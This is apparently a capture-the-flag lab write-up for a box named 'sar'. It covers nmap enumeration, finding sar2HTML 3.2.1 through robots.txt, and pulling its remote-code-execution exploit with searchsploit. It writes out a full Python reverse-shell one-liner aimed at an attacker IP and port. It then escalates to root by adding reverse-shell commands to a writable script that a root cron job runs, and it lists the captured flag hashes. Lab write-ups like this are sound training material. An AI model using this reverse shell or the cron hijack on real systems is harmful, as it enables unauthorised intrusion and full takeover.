# [Recon]

```
=========================================================================
[OS]: Ubuntu
[Web-Technology]: Apache httpd 2.4.29
[Hostname]:  sar
[IP]:  192.168.215.35
[USERS]: love
[CREDENTIALS]: 
=========================================================================
```
-----------------------------------------------------------------------------

# [Scanning and Enumeration]

	[NMAP]

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHy/WJJHLFdbwbJpTyRYhEyj2jZV024UPWIdXfNHxq45uh08jkihv3znZ98caLP/pz352c0ZYD31We0bTSbHyjQce2bSAJHubDYp13hU/P4tbV5GIJ72W2rWkLTslH/SJoHUSqlManB7ZzgVyU2KQ4fnNx/V1XGJYsshquRqTrXKeeal+yQvTC4gnsr8ENIGMq0yJnYxMAasx6kmSc+S+065Mie65xkyisFXo2MQyxzsFdCu2w1bYmb3pegYDm6Y0c/EJP0sxDizXVwkUOS0XSVdGuk3RUYjt5GQ2fL24ZsML6CwN+HD2ZTnD0FK90PQTLuvlp6BoI/ZWvIenNvu63
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgxutbLnN4K2tj6ZHzrlzTKS+RRuly+RkA0J63JsQFiwyvz4PqA64w/h0Se3gymZV6zJ9XBpS41b6IoEymeiSA=
|   256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM+5254x35Vwa2S7X73YLY87Q58qQOD9oQeSKMpmmT0o
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-----------------------------------------------------------------------------

	[Web Enumeration]

```
/robots.txt --> /sar2HTML
```

Upon visiting the `sar2HTML` endpoint, I notice a static web page that contains a lot of information about the `sar2html`

![[Pasted image 20240829222830.png]]

Before proceeding with anything, I noticed that it has a version so i googled the `sar2html` which reveals more about the python web based application that allows one to plot and analyze sar data from various operating systems. Also a tool for system statistics `sar data`. It is also vulnerable to `Remote Code Execution`  in specific versions all the way to `3.2.1`. 
![[Pasted image 20240829223153.png]]

Also i use the `searchsploit` utility tool to look for same vulnerability using the terminal so it return 2 results indicating a python exploit and a text file.
```bash
searchsploit sar2html 3.2.1
locate php/webapps/49344.py
cp /usr/share/exploitdb/exploits/php/webapps/49344.py .
locate php/webapps/47204.txt
cat /usr/share/exploitdb/exploits/php/webapps/47204.txt
```
![[Pasted image 20240829233933.png]]

Time to run the exploit and check what it does. We can also do that by `reading` the content of the exploit. So we run the exploit..

![[Pasted image 20240829221713.png]]


![[Pasted image 20240829221911.png]]

I tried other `revshells` [bash, nc, and others] but none seems to work. So i thought of using this long python version and `BOOM` we got a shell!

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.152",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![[Pasted image 20240829225258.png]]

![[Pasted image 20240829225543.png]]

---------------------------------------------------------------------------------------------------

# [Privilege-Escalation]

--> At this point, I tried lateral movement and basic privesc techniques to uncover more information but end up with nothing. So i decided to upload `linpeas.sh`. Upon uploading the linpeas.sh file and running it, Here we go lots of `file owners as root` came up. I notice the one i saw earlier after gaining access to the box in `var/www/html`.

![[Pasted image 20240829235302.png]]
The `finally.sh` script is running as root user. maybe there might be some `cron jobs` running the script in the background but lets confirm.

![[Pasted image 20240829235751.png]]
and there we go its running as root but we can not modify the file nor executes it but we can `read` the content of the file and after i did just that i noticed the script only executes a script in the same directory as the finally.sh script.

![[Pasted image 20240830000705.png]]

And it seems like we can `read, write and execute` the `write.sh` script which is owned by us [www-data] So lets add some `bash or python3` revshells commands to the file before the `finally.sh` scripts executes it in the  next five minutes .

![[Pasted image 20240830002240.png]]
And after some minutes, we gain privileges as root.

![[Pasted image 20240830002429.png]]

---------------------------------------------------------------------------------------------------

# [Take away Concept]
```
=========================================================================
* Always explore webshells
* Check for cron jobs [crontab -l, cat /etc/crontab]
* Try multiple Reverse shells [python3, bash, nc]
=========================================================================
```

---------------------------------------------------------------------------------------------------

# [Flags]

`local.txt : 9dd50fe1ee4fafce9bb2cc21ca38bbf1`
`proof.txt : 4fe5149021391723e23839b8e20a2d0d`


---------------------------------------------------------------------------------------------------
